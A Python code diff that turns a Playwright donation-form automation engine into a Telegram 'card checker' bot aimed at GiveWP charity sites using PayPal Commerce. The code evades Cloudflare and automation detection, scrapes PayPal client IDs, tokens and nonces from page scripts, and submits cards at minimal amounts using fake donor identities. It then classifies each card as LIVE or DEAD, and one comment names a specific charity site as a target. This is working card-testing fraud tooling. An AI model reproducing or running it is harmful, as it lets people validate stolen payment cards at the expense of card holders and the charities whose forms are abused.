@@ -1,931 +1,1678 @@
-#!/usr/bin/env python3
 """
-Playwright GiveWP Engine v12 — Ultimate Edition
-================================================
-محرك فحص شامل لمواقع GiveWP PayPal Commerce
-- بيفتح متصفح حقيقي
-- بيملأ كل أنواع الفورم
-- بيختار المبلغ بأي طريقة
-- بيتعامل مع PayPal iframe
-- بيتجاوز Cloudflare/antibot
-- بيصور screenshots للتشخيص
+PayPal-Commerce Card Checker Bot — Final
+- PayPal Commerce only (No Stripe)
+- curl_cffi session + Cloudflare bypass
+- admin-ajax create_order + approve_order
+- Orders v2 fallback
+- Real responses from the target site only
+- Full response classifier (Kovak's spec, verbatim)
 """
 
-import asyncio
-import os
 import re
-import time
 import json
 import random
+import time
 import base64
-import uuid
+import gzip
+import zlib
+import html as html_lib
+import os
+import sys
+import gc
+import threading
+from urllib.parse import unquote, urlparse, parse_qs
 from datetime import datetime
-from pathlib import Path
 
-from playwright.async_api import async_playwright, TimeoutError as PWTimeout, Error as PWError
+try:
+    from curl_cffi import requests as curl_requests
+    HAS_CURL_CFFI = True
+except ImportError:
+    HAS_CURL_CFFI = False
+    import requests as curl_requests
+
+import telebot
+from telebot import types
 
 
-# ═══════════════════════════════════════════════════════════════════════
-# CONFIGURATION
-# ═══════════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+# TOKEN DECODER
+# ═══════════════════════════════════════════════════════════════════
+
+class TokenDecoder:
+    @staticmethod
+    def try_base64(s):
+        try:
+            s2 = s.replace('-', '+').replace('_', '/')
+            s2 += '=' * (-len(s2) % 4)
+            return base64.b64decode(s2).decode('utf-8', errors='ignore')
+        except Exception:
+            return None
+
+    @staticmethod
+    def try_base64_gzip(s):
+        try:
+            s2 = s.replace('-', '+').replace('_', '/')
+            s2 += '=' * (-len(s2) % 4)
+            raw = base64.b64decode(s2)
+            try:
+                return gzip.decompress(raw).decode('utf-8', errors='ignore')
+            except Exception:
+                try:
+                    return zlib.decompress(raw).decode('utf-8', errors='ignore')
+                except Exception:
+                    return None
+        except Exception:
+            return None
+
+    @staticmethod
+    def try_hex(s):
+        try:
+            if re.fullmatch(r'[0-9a-fA-F]+', s) and len(s) % 2 == 0:
+                return bytes.fromhex(s).decode('utf-8', errors='ignore')
+        except Exception:
+            pass
+        return None
+
+    @staticmethod
+    def try_url(s):
+        try:
+            if '%' in s:
+                return unquote(s)
+        except Exception:
+            pass
+        return None
+
+    @staticmethod
+    def try_jwt(s):
+        if s.count('.') == 2:
+            parts = s.split('.')
+            out = {}
+            for name, p in zip(['header', 'payload', 'signature'], parts):
+                dec = TokenDecoder.try_base64(p)
+                if dec:
+                    try:
+                        out[name] = json.loads(dec)
+                    except Exception:
+                        out[name] = dec
+            return out
+        return None
+
+    @staticmethod
+    def decode_all(value, depth=0):
+        if depth > 3 or not value or len(value) > 20000:
+            return {}
+        results = {}
+        for name, fn in {
+            'base64': TokenDecoder.try_base64,
+            'base64_gzip': TokenDecoder.try_base64_gzip,
+            'hex': TokenDecoder.try_hex,
+            'url': TokenDecoder.try_url,
+            'jwt': TokenDecoder.try_jwt,
+        }.items():
+            try:
+                r = fn(value)
+                if r and r != value:
+                    results[name] = r
+            except Exception:
+                continue
+        return results
+
+
+# ═══════════════════════════════════════════════════════════════════
+# GATEWAY EXTRACTOR
+# ═══════════════════════════════════════════════════════════════════
+
+class GatewayExtractor:
+    PATTERNS = {
+        'client_id': [
+            r'client[_-]?id["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{15,})["\']',
+            r'data-client-id="([^"]+)"',
+            r'"clientId"\s*:\s*"([A-Za-z0-9_-]{15,})"',
+            r'"client_id"\s*:\s*"([A-Za-z0-9_-]{15,})"',
+            r'paypal[_-]?client[_-]?id["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{15,})',
+            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{15,})',
+            r'data-ppcp-client-id="([^"]+)"',
+            r'data-paypal-client-id="([^"]+)"',
+            r'<meta[^>]+name="paypal-client-id"[^>]+content="([^"]+)"',
+        ],
+        'client_token': [
+            r'client[_-]?token["\']?\s*[:=]\s*["\']([A-Za-z0-9._\-]{20,})["\']',
+            r'"client_token"\s*:\s*"([^"]+)"',
+            r'"clientToken"\s*:\s*"([^"]+)"',
+            r'bearer\s+([A-Za-z0-9._\-]{40,})',
+        ],
+        'access_token': [
+            r'access[_-]?token["\']?\s*[:=]\s*["\']([A-Za-z0-9._\-]{20,})["\']',
+            r'"access_token"\s*:\s*"([^"]+)"',
+            r'"accessToken"\s*:\s*"([^"]+)"',
+        ],
+        'form_id': [
+            r'give-form-id["\']?\s*[:=]\s*["\']?(\d+)',
+            r'data-give-form-id="(\d+)"',
+            r'name="give-form-id"[^>]*value="(\d+)"',
+            r'give-form-id-prefix["\']?\s*[:=]\s*["\']?(\d+)',
+            r'data-form-id="(\d+)"',
+            r'form-id["\']?\s*[:=]\s*["\']?(\d+)',
+        ],
+        'form_hash': [
+            r'give-form-hash["\']?\s*[:=]\s*["\']?([a-f0-9]{20,})',
+            r'data-give-form-hash="([a-f0-9]+)"',
+            r'name="give-form-hash"[^>]*value="([^"]+)"',
+            r'give_form_hash["\']?\s*[:=]\s*["\']?([a-f0-9]+)',
+        ],
+        'nonce': [
+            r'_wpnonce["\']?\s*[:=]\s*["\']?([a-f0-9]{8,})',
+            r'name="_wpnonce"[^>]*value="([^"]+)"',
+            r'wp[_-]?nonce["\']?\s*[:=]\s*["\']?([a-f0-9]+)',
+            r'"nonce"\s*:\s*"([a-f0-9]+)"',
+            r'security["\']?\s*[:=]\s*["\']([a-f0-9]{8,})',
+        ],
+        'ajax_url': [
+            r'["\']([^"\']*admin-ajax\.php[^"\']*)["\']',
+            r'ajax[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'ajaxurl["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'["\']([^"\']*\?wc-ajax=[^"\']+)["\']',
+            r'["\'](/wp-json/[^"\']+)["\']',
+        ],
+        'paypal_sdk_url': [
+            r'["\'](https://www\.paypal\.com/sdk/js\?[^"\']+)["\']',
+            r'["\'](https://www\.paypal\.com/sdk/js[^"\']*)["\']',
+        ],
+        'terms_accept': [
+            r'name="([^"]*agree[^"]*)"[^>]*value="1"',
+            r'name="([^"]*terms[^"]*)"[^>]*value="1"',
+            r'name="([^"]*tos[^"]*)"[^>]*value="1"',
+            r'id="([^"]*give[^"]*terms[^"]*)"',
+            r'name="([^"]*accept[^"]*)"',
+        ],
+        'currency': [
+            r'give-currency["\']?\s*[:=]\s*["\']?([A-Z]{3})',
+            r'currency["\']?\s*[:=]\s*["\']?([A-Z]{3})',
+            r'data-currency="([A-Z]{3})"',
+        ],
+        'amount': [
+            r'give-amount["\']?\s*[:=]\s*["\']?([\d.]+)',
+            r'data-min-amount="([\d.]+)"',
+            r'data-minimum-amount="([\d.]+)"',
+            r'minimum donation amount[^\d]*([\d.]+)',
+            r'name="give-amount"[^>]*value="([\d.]+)"',
+            r'data-amount="([\d.]+)"',
+        ],
+        'prefix_field': [
+            r'name="(give_title|give_title_prefix|give_prefix|title)"',
+            r'id="give_title"',
+            r'<select[^>]*name="([^"]*title[^"]*)"',
+        ],
+    }
+
+    @classmethod
+    def _extract_scripts(cls, html_text):
+        scripts = re.findall(r'<script[^>]*>(.*?)</script>', html_text, re.DOTALL | re.IGNORECASE)
+        return '\n'.join(scripts)
+
+    @classmethod
+    def _decode_and_recheck(cls, blob):
+        extra = []
+        for m in re.findall(r'[A-Za-z0-9+/_-]{20,}={0,2}', blob):
+            dec = TokenDecoder.try_base64(m) or TokenDecoder.try_base64_gzip(m)
+            if dec and any(k in dec.lower() for k in ['client', 'form', 'nonce', 'token', 'give', 'paypal']):
+                extra.append(dec)
+        return '\n'.join(extra)
+
+    @classmethod
+    def extract_all(cls, html_text):
+        if not html_text:
+            return {}
+        blob = html_lib.unescape(html_text)
+        scripts = cls._extract_scripts(html_text)
+        blob += '\n' + cls._decode_and_recheck(scripts)
+        blob += '\n' + scripts
+
+        out = {}
+        for key, plist in cls.PATTERNS.items():
+            found = []
+            for pat in plist:
+                for m in re.findall(pat, blob, re.IGNORECASE):
+                    if m and m not in found:
+                        found.append(m)
+            if found:
+                out[key] = found
+        return out
+
+
+# ═══════════════════════════════════════════════════════════════════
+# OAUTH HELPER
+# ═══════════════════════════════════════════════════════════════════
+
+class OAuthHelper:
+    @staticmethod
+    def fetch_client_credentials(session, client_id, client_secret=''):
+        try:
+            r = session.post(
+                'https://api-m.paypal.com/v1/oauth2/token',
+                data={'grant_type': 'client_credentials'},
+                auth=(client_id, client_secret),
+                headers={'Accept': 'application/json'},
+                timeout=15,
+            )
+            if r.status_code == 200:
+                j = r.json()
+                return {
+                    'access_token': j.get('access_token'),
+                    'expires_in': j.get('expires_in'),
+                    'scope': j.get('scope'),
+                }
+        except Exception:
+            pass
+        return None
+
+    @staticmethod
+    def fetch_client_token(session, ajax_url, form_id, nonce, cookies, headers, url, inurl):
+        actions = [
+            'give_paypal_commerce_get_client_token',
+            'give_paypal_get_client_token',
+            'give_paypal_donations_get_client_token',
+            'give_paypal_express_get_client_token',
+            'give_get_client_token',
+            'ppcp_get_client_token',
+            'wc_ajax_ppcp_get_client_token',
+            'get_client_token',
+        ]
+        for a in actions:
+            try:
+                r = session.post(
+                    ajax_url,
+                    params={'action': a},
+                    data={'form-id': form_id or '', 'form_id': form_id or ''},
+                    headers=headers,
+                    cookies=cookies,
+                    timeout=15,
+                )
+                if r.status_code == 200 and r.text:
+                    try:
+                        j = r.json()
+                        d = j.get('data')
+                        if isinstance(d, dict):
+                            tok = d.get('client_token') or d.get('token') or d.get('access_token')
+                        elif isinstance(d, str):
+                            tok = d
+                        else:
+                            tok = None
+                        if tok:
+                            return {'action': a, 'client_token': tok}
+                    except Exception:
+                        if 20 < len(r.text) < 500:
+                            return {'action': a, 'raw': r.text.strip()[:200]}
+            except Exception:
+                continue
+        return None
+
+    @staticmethod
+    def parse_sdk_url(sdk_url):
+        try:
+            q = parse_qs(urlparse(sdk_url).query)
+            return {k: v[0] for k, v in q.items()}
+        except Exception:
+            return {}
+
+
+# ═══════════════════════════════════════════════════════════════════
+# CONSTANTS
+# ═══════════════════════════════════════════════════════════════════
+
+PAYPAL_CURRENCIES = {
+    'AUD', 'BRL', 'CAD', 'CZK', 'DKK', 'EUR', 'HKD', 'HUF', 'ILS', 'JPY',
+    'MYR', 'MXN', 'TWD', 'NZD', 'NOK', 'PHP', 'PLN', 'GBP', 'RUB', 'SGD',
+    'SEK', 'CHF', 'THB', 'USD',
+}
+
+ZERO_DECIMAL_CURRENCIES = {'HUF', 'JPY', 'TWD'}
+
+MALE_NAMES = {
+    'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
+    'Joseph', 'Thomas', 'Charles', 'Daniel', 'Matthew', 'Anthony', 'Mark',
+    'Steven', 'Paul', 'Andrew', 'Joshua', 'Kevin', 'Brian', 'Edward',
+    'George', 'Ronald', 'Roger', 'Noah',
+}
+
+TITLES_MALE = ['Mr', 'Dr']
+TITLES_FEMALE = ['Mrs', 'Ms', 'Miss', 'Dr']
 
 USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15',
 ]
 
-AMOUNTS_TO_TRY = ['1', '2', '3', '5', '10', '20', '25', '50', '100']
 
-FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph']
-LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
-STREETS = ['123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Boulevard']
-CITIES = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
-STATES = ['NY', 'CA', 'IL', 'TX', 'AZ']
-ZIPS = ['10001', '90001', '60601', '77001', '85001']
+# ═══════════════════════════════════════════════════════════════════
+# PAYPAL COMMERCE
+# ═══════════════════════════════════════════════════════════════════
 
-# ═══════════════════════════════════════════════════════════════════════
-# RESPONSE CLASSIFIER
-# ═══════════════════════════════════════════════════════════════════════
+class PayPalCommerce:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        parsed = urlparse(target_url)
+        self.url = parsed.netloc
+        self.inurl = parsed.path
+        if parsed.query:
+            self.inurl += f'?{parsed.query}'
 
-class Classifier:
-    """يصنّف الردود من PayPal والموقع"""
-    
-    LIVE_KEYWORDS = {
-        'CHARGE_SUCCESS': ['success', 'approved', 'charged', 'completed', 'thank you'],
-        'INSUFFICIENT_FUNDS': ['insufficient', 'not enough', 'nsf'],
-        'DO_NOT_HONOR': ['do not honor'],
-        'CVV_FAILURE': ['cvv', 'security code', 'cvc'],
-        'EXPIRED_CARD': ['expired', 'expiration'],
-        'SUSPECTED_FRAUD': ['fraud', 'suspicious'],
-        'DECLINED': ['declined', 'denied', 'rejected', 'refused'],
-        'ACCOUNT_CLOSED': ['closed', 'locked'],
-        'ORDER_NOT_APPROVED': ['order_not_approved', 'not yet approved'],
-        '3DS_REQUIRED': ['authentication', '3d secure', 'verify'],
-        'PAYER_CANNOT_PAY': ['cannot pay', 'payer cannot'],
-        'INVALID_CARD': ['invalid card', 'invalid number'],
-        'GENERIC_DECLINE': ['generic decline'],
-        'RESTRICTED': ['restricted', 'blocked', 'inactive'],
-        'COMPLIANCE_VIOLATION': ['compliance'],
-        'TRANSACTION_NOT_PERMITTED': ['not permitted'],
-        'PAYMENT_DENIED': ['payment denied'],
-        'SECURITY_VIOLATION': ['security violation'],
-        'LIMIT_EXCEEDED': ['limit exceeded', 'attempts exceed'],
-    }
-    
-    DEAD_KEYWORDS = {
-        'CLOUDFLARE': ['just a moment', 'verifying', 'checking your browser', 'cf-browser'],
-        'ANTIBOT': ['captcha', 'not a robot', 'compruebe que no es'],
-        'NO_FORM': ['form not published', 'no form', 'form is not available'],
-        'GATEWAY_DISABLED': ['gateway is not enabled', 'payment gateway is not'],
-        'JS_CONFLICT': ['javascript conflict', 'connection between this site'],
-        'FORM_INCOMPLETE': ['billing address', 'required field', 'is required'],
-        'CREATE_FAILED': ['create order failed', 'could not create'],
-        'MINIMUM_NOT_MET': ['minimum donation', 'amount is invalid'],
-    }
-    
-    @classmethod
-    def classify(cls, text):
-        if not text: return ('DEAD', 'EMPTY')
-        low = text.lower()
-        
-        # DEAD first
-        for code, kws in cls.DEAD_KEYWORDS.items():
-            for kw in kws:
-                if kw in low:
-                    return ('DEAD', code)
-        
-        # LIVE codes
-        for code, kws in cls.LIVE_KEYWORDS.items():
-            for kw in kws:
-                if kw in low:
-                    return ('LIVE', code)
-        
-        return ('UNKNOWN', 'UNKNOWN')
+        self.session = None
+        self.cookies = {}
+        self.user_agent = random.choice(USER_AGENTS)
+        self.html = ''
 
+        self.client_id = None
+        self.client_secret = ''
+        self.client_token = None
+        self.access_token = None
+        self.ajax_url = None
+        self.form_data = {}
+        self.currency = 'USD'
+        self.minimum_amount = '1.00'
+        self.terms_fields = []
+        self.prefix_field = None
+        self.is_valid = False
 
-# ═══════════════════════════════════════════════════════════════════════
-# MAIN ENGINE
-# ═══════════════════════════════════════════════════════════════════════
+        self._init_session()
+        self._fetch_page()
+        self._extract_and_setup()
+        self._get_tokens()
 
-class PlaywrightEngine:
-    """v12 — المحرك الشامل"""
-    
-    def __init__(self, url, card, verbose=True, screenshots=False):
-        self.url = url
-        self.card = card
-        self.verbose = verbose
-        self.screenshots = screenshots
-        self.debug = {
-            'url': url,
-            'steps': [],
-            'network': [],
-            'paypal_responses': [],
-            'screenshots': [],
-            'form_found': None,
-            'amount_selected': None,
-            'paypal_frame': False,
-            'card_filled': False,
-        }
-    
-    def log(self, msg):
-        if self.verbose:
-            print(msg)
-        self.debug['steps'].append(msg)
-    
-    async def _screenshot(self, page, name):
-        if not self.screenshots:
-            return
-        try:
-            ts = int(time.time())
-            path = f'/tmp/pw_{name}_{ts}.png'
-            await page.screenshot(path=path, full_page=False)
-            self.debug['screenshots'].append(path)
-            self.log(f'      📸 {path}')
-        except:
-            pass
-    
-    async def _on_response(self, response):
-        """يسجل كل responses اللي تهمنا"""
-        try:
-            url = response.url
-            if any(k in url for k in ['create_order', 'confirm-payment', 'approve_order',
-                                       'checkout/orders', 'paypal.com/v2']):
-                body = ''
-                try:
-                    body = await response.text()
-                except:
-                    pass
-                self.debug['network'].append({
-                    'url': url[:150],
-                    'status': response.status,
-                    'body': body[:800],
-                })
-                if 'paypal.com' in url or 'confirm-payment' in url:
-                    self.debug['paypal_responses'].append({
-                        'status': response.status,
-                        'body': body[:500],
-                    })
-        except:
-            pass
-    
-    # ═══════════════════════════════════════════════════════════════
-    # MAIN RUN
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def run(self):
-        async with async_playwright() as p:
-            self.log('  🚀 launching chromium...')
-            
-            try:
-                browser = await p.chromium.launch(
-                    headless=True,
-                    args=[
-                        '--no-sandbox',
-                        '--disable-setuid-sandbox',
-                        '--disable-blink-features=AutomationControlled',
-                        '--disable-dev-shm-usage',
-                        '--disable-gpu',
-                        '--no-first-run',
-                        '--no-zygote',
-                        '--disable-features=IsolateOrigins,site-per-process',
-                        '--disable-web-security',
-                        '--ignore-certificate-errors',
-                        '--allow-running-insecure-content',
-                    ]
-                )
-            except Exception as e:
-                return self._err(f'LAUNCH_FAILED: {e}')
-            
-            try:
-                context = await browser.new_context(
-                    user_agent=random.choice(USER_AGENTS),
-                    viewport={'width': 1366, 'height': 900},
-                    locale='en-US',
-                    timezone_id='America/New_York',
-                    ignore_https_errors=True,
-                    java_script_enabled=True,
-                    extra_http_headers={
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                        'sec-ch-ua-mobile': '?0',
-                        'sec-ch-ua-platform': '"Windows"',
-                    }
-                )
-                # تجاوز كشف automation
-                await context.add_init_script("""
-                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
-                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
-                    window.chrome = {runtime: {}};
-                """)
-                
-                page = await context.new_page()
-                page.on('response', self._on_response)
-                
-                result = await self._execute(page, browser, context)
-                return result
-            finally:
-                try:
-                    await browser.close()
-                except:
-                    pass
-    
-    def _err(self, msg):
-        return {'status': 'DEAD', 'code': msg[:100], 'raw': msg[:300], 'debug': self.debug}
-    
-    async def _execute(self, page, browser, context):
-        # ═══ Stage 1: Load page ═══
-        self.log(f'\n  [1] Loading {self.url}')
-        try:
-            await page.goto(self.url, wait_until='domcontentloaded', timeout=45000)
-        except PWTimeout:
-            self.log('      ⚠️ timeout, continuing...')
-        except Exception as e:
-            return self._err(f'GOTO_FAILED: {e}')
-        
-        await page.wait_for_timeout(3000)
-        await self._screenshot(page, '01_loaded')
-        
-        # ═══ Stage 2: Cloudflare/antibot check ═══
-        self.log('  [2] Checking cloudflare/antibot...')
-        html = await page.content()
-        if any(x in html.lower() for x in ['just a moment', 'verifying you are',
-                                            'checking your browser', 'cf-browser-verification']):
-            self.log('      ⚠️ Cloudflare — waiting up to 20s...')
-            for i in range(4):
-                await page.wait_for_timeout(5000)
-                html = await page.content()
-                if 'just a moment' not in html.lower() and 'verifying' not in html.lower():
-                    self.log(f'      ✅ passed after {(i+1)*5}s')
-                    break
-            else:
-                return self._err('CLOUDFLARE_BLOCKED')
-        
-        if any(x in html.lower() for x in ['captcha', 'not a robot', 'g-recaptcha', 'hcaptcha']):
-            self.log('      ⚠️ captcha detected')
-            return self._err('CAPTCHA_BLOCKED')
-        
-        # ═══ Stage 3: Find form ═══
-        self.log('  [3] Finding GiveWP form...')
-        form_info = await self._find_form(page)
-        if not form_info:
-            return self._err('NO_FORM')
-        self.debug['form_found'] = form_info['type']
-        self.log(f'      ✅ form: {form_info["type"]}')
-        
-        # ═══ Stage 4: Fill personal data ═══
-        self.log('  [4] Filling personal data...')
-        await self._fill_personal(page)
-        
-        # ═══ Stage 5: Select amount ═══
-        self.log('  [5] Selecting amount...')
-        amount = await self._select_amount_smart(page)
-        self.debug['amount_selected'] = amount
-        if amount:
-            self.log(f'      ✅ selected ${amount}')
+    def _init_session(self):
+        if HAS_CURL_CFFI:
+            self.session = curl_requests.Session(impersonate="chrome133a")
         else:
-            self.log(f'      ⚠️ could not select amount, trying anyway')
-        
-        # ═══ Stage 6: Fill billing ═══
-        self.log('  [6] Filling billing (if required)...')
-        await self._fill_billing(page)
-        
-        # ═══ Stage 7: Accept terms ═══
-        self.log('  [7] Accepting terms...')
-        await self._check_terms(page)
-        
-        # ═══ Stage 8: Click donate ═══
-        self.log('  [8] Clicking donate...')
-        clicked = await self._click_donate(page)
-        if not clicked:
-            return self._err('CLICK_FAILED')
-        
-        await page.wait_for_timeout(3000)
-        await self._screenshot(page, '02_after_click')
-        
-        # ═══ Stage 9: Wait for PayPal or error ═══
-        self.log('  [9] Waiting for PayPal or error...')
-        paypal = await self._wait_paypal(page, timeout=20)
-        
-        # لو مفيش PayPal، اقرأ الرد من الصفحة
-        if not paypal:
-            page_text = await page.inner_text('body')
-            status, code = Classifier.classify(page_text)
-            if status == 'DEAD':
-                return {'status': 'DEAD', 'code': code, 'raw': page_text[:400], 'debug': self.debug}
-            # ممكن يكون راح على صفحة شكر
-            if 'thank' in page_text.lower() or 'success' in page_text.lower():
-                return {'status': 'LIVE', 'code': 'CHARGE_SUCCESS', 'raw': page_text[:400], 'debug': self.debug}
-            return self._err(f'NO_PAYPAL: {page_text[:100]}')
-        
-        self.debug['paypal_frame'] = True
-        self.log('      ✅ PayPal frame found')
-        
-        # ═══ Stage 10: Fill card ═══
-        self.log('  [10] Filling card in PayPal...')
-        card_result = await self._fill_card_paypal(paypal, page)
-        self.debug['card_filled'] = card_result.get('filled', False)
-        
-        if not card_result.get('filled'):
-            return {'status': 'DEAD', 'code': 'CARD_FILL_FAILED',
-                    'raw': card_result.get('error', ''), 'debug': self.debug}
-        
-        # ═══ Stage 11: Submit payment ═══
-        self.log('  [11] Submitting payment...')
-        await self._submit_payment(paypal, page)
-        
-        # ═══ Stage 12: Read final response ═══
-        self.log('  [12] Reading response...')
-        await page.wait_for_timeout(5000)
-        await self._screenshot(page, '03_final')
-        
-        final = await self._read_final_response(page, paypal)
-        final['debug'] = self.debug
-        return final
-    
-    # ═══════════════════════════════════════════════════════════════
-    # FORM DETECTION
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _find_form(self, page):
-        """يدور على الفورم بـ 10 selectors مختلفة"""
-        selectors = [
-            ('givewp_classic', 'form.give-form'),
-            ('givewp_id', 'form[id*="give-form"]'),
-            ('givewp_wrap', '.give-form-wrap form'),
-            ('givewp_any', 'form[class*="give"]'),
-            ('givewp_input', 'input[name="give-amount"]'),
-            ('paypal_form', 'form[class*="paypal"]'),
-            ('generic', 'form'),
-        ]
-        for ftype, sel in selectors:
+            self.session = curl_requests.Session()
+
+    def _default_headers(self):
+        return {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Referer': f'https://{self.url}/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Upgrade-Insecure-Requests': '1',
+        }
+
+    def _fetch_page(self):
+        url = f'https://{self.url}{self.inurl}'
+        headers = self._default_headers()
+
+        for attempt in range(3):
             try:
-                loc = page.locator(sel).first
-                if await loc.count() > 0:
-                    # تأكد إن الفورم فيه input على الأقل
-                    inputs = await page.locator(f'{sel} input').count()
-                    if inputs > 0 or ftype == 'givewp_input':
-                        return {'type': ftype, 'selector': sel}
-            except:
-                continue
-        
-        # آخر محاولة: ابحث في iframe
-        for frame in page.frames:
-            if frame == page.main_frame:
-                continue
-            try:
-                if await frame.locator('input[name="give-amount"], form.give-form').count() > 0:
-                    return {'type': 'iframe', 'frame': frame}
-            except:
-                continue
-        
-        return None
-    
-    # ═══════════════════════════════════════════════════════════════
-    # FILL PERSONAL
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _fill_personal(self, page):
-        """يملأ الاسم والإيميل والإيميل الثاني"""
-        first = random.choice(FIRST_NAMES)
-        last = random.choice(LAST_NAMES)
-        email = f'user{int(time.time()*1000)%999999}@gmail.com'
-        
-        fills = [
-            ('input[name="give_first"]', first),
-            ('input[name="give_last"]', last),
-            ('input[name="give_email"]', email),
-            ('input[name*="first_name"]', first),
-            ('input[name*="last_name"]', last),
-            ('input[type="email"]', email),
-            ('input[name*="email"]', email),
-            ('input[id*="first"]', first),
-            ('input[id*="last"]', last),
-        ]
-        
-        for sel, val in fills:
-            try:
-                loc = page.locator(sel).first
-                if await loc.count() > 0:
-                    if await loc.is_visible(timeout=1000):
-                        await loc.fill(val, timeout=2000)
-            except:
-                continue
-    
-    # ═══════════════════════════════════════════════════════════════
-    # SELECT AMOUNT — 8 طرق
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _select_amount_smart(self, page):
-        """يختار المبلغ بـ 8 طرق، بيبدأ من 1$"""
-        
-        for amt in AMOUNTS_TO_TRY:
-            result = await self._try_select_amount(page, amt)
-            if result:
-                return result
-        return None
-    
-    async def _try_select_amount(self, page, amt):
-        """يحاول يختار مبلغ معين بـ 8 طرق"""
-        
-        # ─── 1. input[name="give-amount"] مباشر ───
-        try:
-            inp = page.locator('input[name="give-amount"]').first
-            if await inp.count() > 0 and await inp.is_visible(timeout=500):
-                await inp.click(timeout=1000)
-                await inp.fill('', timeout=1000)
-                await inp.type(amt, delay=50, timeout=2000)
-                await page.wait_for_timeout(300)
-                return amt
-        except:
-            pass
-        
-        # ─── 2. give-custom-amount input ───
-        try:
-            inp = page.locator('input[name="give-custom-amount"], input.give-custom-amount, input[id*="custom-amount"]').first
-            if await inp.count() > 0 and await inp.is_visible(timeout=500):
-                await inp.fill(amt, timeout=2000)
-                return amt
-        except:
-            pass
-        
-        # ─── 3. زر/button بـ data-price ───
-        for val in [amt, f'{amt}.00', f'{amt}.0']:
-            try:
-                btn = page.locator(f'[data-price="{val}"]').first
-                if await btn.count() > 0:
-                    await btn.scroll_into_view_if_needed(timeout=2000)
-                    await btn.click(timeout=3000)
-                    return amt
-            except:
-                pass
-        
-        # ─── 4. radio input ───
-        for val in [amt, f'{amt}.00']:
-            try:
-                radio = page.locator(f'input[type="radio"][value="{val}"]').first
-                if await radio.count() > 0:
-                    await radio.check(timeout=3000)
-                    return amt
-            except:
-                pass
-        
-        # ─── 5. زر نصه $amt ───
-        try:
-            btn = page.get_by_role('button', name=re.compile(rf'^\${amt}(\.00)?$')).first
-            if await btn.count() > 0:
-                await btn.click(timeout=3000)
-                return amt
-        except:
-            pass
-        
-        # ─── 6. select option ───
-        try:
-            for sel_name in ['select[name*="amount"]', 'select[name="give-amount"]',
-                            'select.give-amount', 'select[id*="amount"]']:
-                sel = page.locator(sel_name).first
-                if await sel.count() > 0:
-                    try:
-                        await sel.select_option(amt, timeout=2000)
-                        return amt
-                    except:
-                        try:
-                            await sel.select_option(f'{amt}.00', timeout=2000)
-                            return amt
-                        except:
-                            pass
-        except:
-            pass
-        
-        # ─── 7. link نصه $amt ───
-        try:
-            link = page.get_by_role('link', name=re.compile(rf'^\${amt}(\.00)?$')).first
-            if await link.count() > 0:
-                await link.click(timeout=3000)
-                return amt
-        except:
-            pass
-        
-        # ─── 8. li/div clickable بـ data-price ───
-        try:
-            el = page.locator(f'.give-donation-level-btn[data-price="{amt}"], li[data-price="{amt}"], div[data-price="{amt}"]').first
-            if await el.count() > 0:
-                await el.click(timeout=3000)
-                return amt
-        except:
-            pass
-        
-        return None
-    
-    # ═══════════════════════════════════════════════════════════════
-    # FILL BILLING — مهم للمواقع اللي بتطلبه (svdpvenicefl)
-    # ═══════════════════════════════════════════════════════════════
-    
-    async def _fill_billing(self, page):
-        """يملأ billing address لو موجود"""
-        first = random.choice(FIRST_NAMES)
-        last = random.choice(LAST_NAMES)
-        street = random.choice(STREETS)
-        city = random.choice(CITIES)
-        state = random.choice(STATES)
-        zipcode = random.choice(ZIPS)
-        
-        billing = [
-            ('input[name*="billing"][name*="first"]', first),
-            ('input[name*="billing"][name*="last"]', last),
-            ('input[name*="address"]', street),
-            ('input[name*="street"]', street),
-            ('input[name*="city"]', city),
-            ('input[name*="state"]', state),
-            ('input[name*="zip"]', zipcode),
-            ('input[name*="postal"]', zipcode),
